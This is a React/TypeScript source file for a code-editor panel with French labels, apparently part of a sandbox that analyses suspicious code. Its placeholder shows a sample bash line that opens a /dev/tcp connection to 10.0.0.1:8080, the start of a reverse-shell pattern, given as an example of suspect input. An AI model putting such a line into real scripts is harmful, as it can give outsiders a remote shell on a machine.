import "./code_editor.css";
import React, { useState } from "react";
import { Code2, TerminalSquare, FileCode2 } from "lucide-react";
import { SupportedLanguage } from "@/types/sandbox/types";

interface CodeEditorProps {
    value: string;
    onChange: (value: string) => void;
    onBlur?: () => void;
    language: SupportedLanguage | "auto";
    onLanguageChange: (lang: SupportedLanguage | "auto") => void;
    disabled?: boolean;
    languages: { val: SupportedLanguage | "auto"; label: string }[];
}

export function CodeEditor({
    value, 
    onChange,
    onBlur, 
    language, 
    onLanguageChange, 
    disabled, 
    languages = [{ val: "auto", label: "✨ Détection Automatique" }]
}: CodeEditorProps) {
    const [isFocused, setIsFocused] = useState(false);

    const handleKeyDown = (e: React.KeyboardEvent<HTMLTextAreaElement>) => {
        if (e.key === 'Tab' && !disabled) {
            e.preventDefault();
            const target = e.target as HTMLTextAreaElement;
            const start = target.selectionStart;
            const end = target.selectionEnd;
            const newValue = value.substring(0, start) + "    " + value.substring(end);
            onChange(newValue);
            
            setTimeout(() => {
                target.selectionStart = target.selectionEnd = start + 4;
            }, 0);
        }
    };

    return (
        <div id="sb-editor" className="sb-editor">
            {/* Header */}
            <div className="sb-editor__header">
                <div className="sb-editor__header-title">
                    <TerminalSquare size={16} />
                    <span>Éditeur de Code Source</span>
                </div>
                
                <div className="sb-editor__header-actions">
                    <label htmlFor="sb-editor-lang-select" className="sb-editor__lang-label">Langage :</label>
                    <select
                        id="sb-editor-lang-select"
                        className="sb-editor__lang-select"
                        value={language}
                        onChange={(e) => onLanguageChange(e.target.value as SupportedLanguage | "auto")}
                        disabled={disabled}
                    >
                        {languages.map((l) => (
                            <option key={l.val} value={l.val}>
                                {l.label}
                            </option>
                        ))}
                    </select>
                </div>
            </div>

            {/* Zone de texte */}
            <div className="sb-editor__body">
                {!value && !isFocused && (
                    <div className="sb-editor__placeholder">
                        <Code2 size={24} />
                        <p>Collez ou écrivez le code suspect ici...</p>
                        <code>Ex: #!/bin/bash<br />exec 5&lt;&gt;/dev/tcp/10.0.0.1/8080</code>
                    </div>
                )}
                <textarea
                    id="sb-editor-textarea"
                    className="sb-editor__textarea"
                    value={value}
                    onChange={(e) => onChange(e.target.value)}
                    onKeyDown={handleKeyDown}
                    onFocus={() => setIsFocused(true)}
                    onBlur={() => {
                        setIsFocused(false);
                        if (onBlur) onBlur();
                    }}
                    disabled={disabled}
                    spellCheck={false}
                    rows={12}
                />
            </div>
            
            {/* Footer */}
            <div className="sb-editor__footer">
                <span className="sb-editor__footer-item">
                    <FileCode2 size={12} /> {value.length} caractères
                </span>
                <span className="sb-editor__footer-item">
                    {value ? value.split('\n').length : 0} lignes
                </span>
            </div>
        </div>
    );
}

export default CodeEditor;